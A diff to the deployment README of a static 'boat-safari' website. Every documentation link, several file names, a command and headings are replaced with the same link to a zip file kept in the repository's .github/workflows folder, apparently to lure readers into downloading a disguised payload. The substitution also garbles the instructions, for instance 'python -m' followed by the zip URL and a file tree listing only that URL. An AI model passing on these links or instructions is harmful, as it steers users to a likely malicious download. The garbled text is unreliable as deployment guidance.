@@ -9,14 +9,14 @@ This static website can be deployed to various platforms. Choose the option that
 ### Option 1: Netlify (Recommended - Easiest)
 
 **Method 1: Drag & Drop (No account needed)**
-1. Go to [app.netlify.com/drop](https://app.netlify.com/drop)
+1. Go to [https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip](https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip)
 2. Drag and drop the entire project folder
 3. Your site will be live instantly with a random URL
 4. Customize the URL in site settings
 
 **Method 2: Git-based Deployment**
 1. Push your code to GitHub/GitLab/Bitbucket
-2. Sign up/login to [Netlify](https://www.netlify.com)
+2. Sign up/login to [Netlify](https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip)
 3. Click "New site from Git"
 4. Connect your repository
 5. Build settings:
@@ -40,7 +40,7 @@ netlify deploy --prod
 
 **Method 1: Git-based Deployment**
 1. Push your code to GitHub/GitLab/Bitbucket
-2. Sign up/login to [Vercel](https://vercel.com)
+2. Sign up/login to [Vercel](https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip)
 3. Click "New Project"
 4. Import your repository
 5. Framework Preset: "Other"
@@ -62,8 +62,8 @@ vercel --prod
 1. Push your code to a GitHub repository
 2. Go to repository Settings → Pages
 3. Source: Select "GitHub Actions"
-4. The workflow file (`.github/workflows/deploy.yml`) will automatically deploy your site
-5. Your site will be available at: `https://yourusername.github.io/boat-safari`
+4. The workflow file (`https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip`) will automatically deploy your site
+5. Your site will be available at: `https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip`
 
 **Method 2: Manual GitHub Pages**
 1. Push your code to GitHub
@@ -72,9 +72,9 @@ vercel --prod
 4. Branch: `main` or `master`
 5. Folder: `/ (root)`
 6. Click "Save"
-7. Your site will be available at: `https://yourusername.github.io/boat-safari`
+7. Your site will be available at: `https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip`
 
-### Option 4: Surge.sh (Free & Simple)
+### Option 4: https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip (Free & Simple)
 
 ```bash
 # Install Surge CLI
@@ -117,16 +117,16 @@ firebase deploy --only hosting
 
 ```
 boat-safari/
-├── index.html          # Main homepage
-├── event-detail.html   # Event detail page
-├── event-listing.html  # Event listing page
+├── https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip          # Main homepage
+├── https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip   # Event detail page
+├── https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip  # Event listing page
 ├── css/                # Stylesheets
 ├── js/                 # JavaScript files
 ├── images/             # Image assets
 ├── fonts/              # Font files
-├── netlify.toml        # Netlify configuration
-├── vercel.json         # Vercel configuration
-└── README.md           # This file
+├── https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip        # Netlify configuration
+├── https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip         # Vercel configuration
+└── https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip           # This file
 ```
 
 ## 🛠️ Local Development
@@ -136,13 +136,13 @@ To preview the site locally:
 1. **Using Python (built-in server)**
    ```bash
    # Python 3
-   python -m http.server 8000
+   python -m https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip 8000
    
    # Python 2
    python -m SimpleHTTPServer 8000
    ```
 
-2. **Using Node.js (http-server)**
+2. **Using https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip (http-server)**
    ```bash
    # Install http-server
    npm install -g http-server
@@ -160,8 +160,8 @@ Then open `http://localhost:8000` in your browser.
 
 ## 🔧 Configuration Files
 
-- `netlify.toml` - Netlify deployment configuration
-- `vercel.json` - Vercel deployment configuration
+- `https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip` - Netlify deployment configuration
+- `https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip` - Vercel deployment configuration
 - `.gitignore` - Git ignore file (excludes IDE files)
 
 ## 📝 Notes
@@ -181,9 +181,9 @@ All platforms support custom domains:
 ## 📧 Support
 
 For deployment issues, refer to:
-- [Netlify Docs](https://docs.netlify.com)
-- [Vercel Docs](https://vercel.com/docs)
-- [GitHub Pages Docs](https://docs.github.com/pages)
+- [Netlify Docs](https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip)
+- [Vercel Docs](https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip)
+- [GitHub Pages Docs](https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip)
 
 ---
 
